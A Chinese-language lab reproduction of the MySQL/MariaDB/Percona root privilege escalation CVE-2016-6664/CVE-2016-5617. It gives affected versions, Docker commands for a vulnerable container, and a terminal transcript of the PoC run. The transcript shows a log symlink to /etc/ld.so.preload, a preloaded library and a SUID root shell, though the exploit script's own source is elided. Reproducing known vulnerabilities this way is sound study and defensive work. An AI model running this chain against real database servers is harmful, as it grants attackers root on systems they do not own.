## MySQL / MariaDB / PerconaDB - root权限提升

http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html

在`cve-2016-6663`的基础上将mysql用户提权至root用户

## info 

```
漏洞发现人：Dawid Golunski

漏洞级别：严重

CVE编号 ：CVE-2016-6664 / CVE-2016-5617

漏洞影响：

MySQL  
	<= 5.5.51
	<= 5.6.32
	<= 5.7.14

MariaDB
	All current

Percona Server
	< 5.5.51-38.2
	< 5.6.32-78-1
	< 5.7.14-8

Percona XtraDB Cluster
	< 5.6.32-25.17
	< 5.7.14-26.17
	< 5.5.41-37.0
```

## show

```
docker pull janes/mysql:cve-2016-6663
docker run --name mysql_vuln -it janes/mysql:cve-2016-6663 /bin/bash

root@634abbd9f084:/# grep -r syslog /etc/mysql
/etc/mysql/conf.d/mysqld_safe_syslog.cnf:syslog
root@634abbd9f084:/# cd /etc/mysql/conf.d/
root@634abbd9f084:/# mv mysqld_safe_syslog.cnf mysqld_safe_syslog.cnf.bak
root@634abbd9f084:/# service mysql start

root@634abbd9f084:/# su attacker
attacker@634abbd9f084:/$ cd /tmp
attacker@634abbd9f084:/$ vim poc.sh 
......
attacker@634abbd9f084:/$ chmod 777 poc.sh
attacker@634abbd9f084:/tmp$ ./poc attacker mysqlvuln localhost testdb
......
mysql_suid_shell.MYD-4.3$ whoami
mysql

mysql_suid_shell.MYD-4.3$ ./poc.sh /var/log/mysql/error.log 
 
MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit 
mysql-chowned.sh (ver. 1.0)

CVE-2016-6664 / CVE-2016-5617

Discovered and coded by: 

Dawid Golunski 
http://legalhackers.com 

[+] Starting the exploit as 
uid=1001(attacker) gid=1001(attacker) euid=102(mysql) groups=106(mysql),1001(attacker)

[+] Target MySQL log file set to /var/log/mysql/error.log

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 mysql attacker 1021112 Nov  7 11:25 /tmp/mysqlrootsh

[+] Symlink created at: 
lrwxrwxrwx 1 mysql adm 18 Nov  7 11:25 /var/log/mysql/error.log -> /etc/ld.so.preload

[+] Waiting for MySQL to re-open the logs/MySQL service restart...

[+] Waiting for MySQL to re-open the logs/MySQL service restart...
Do you want to kill mysqld process 1045 to instantly get root? :) ? [y/n] y
Got it. Executing 'killall mysqld' now...

[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: 
-rw-r----- 1 mysql root 19 Nov  7 11:25 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 1021112 Nov  7 11:25 /tmp/mysqlrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 1021112 Nov  7 11:25 /tmp/mysqlrootsh

Got root! The database server has been ch-OWNED !

[+] Spawning the rootshell /tmp/mysqlrootsh now! 

mysqlrootsh-4.3# whoami
root
```

OR 

`docker pull janes/mysql:cve-2016-6664`

## detail

`poc.sh` 第19行指出该脚本要求mysql不配置 syslog 选项， 因此 `mv mysqld_safe_syslog.cnf mysqld_safe_syslog.cnf.bak`， 注释该选项

```
# The exploit requires that file-based logging has been configured (default).
# To confirm that syslog logging has not been enabled instead use:
# grep -r syslog /etc/mysql
# which should return no results.
```

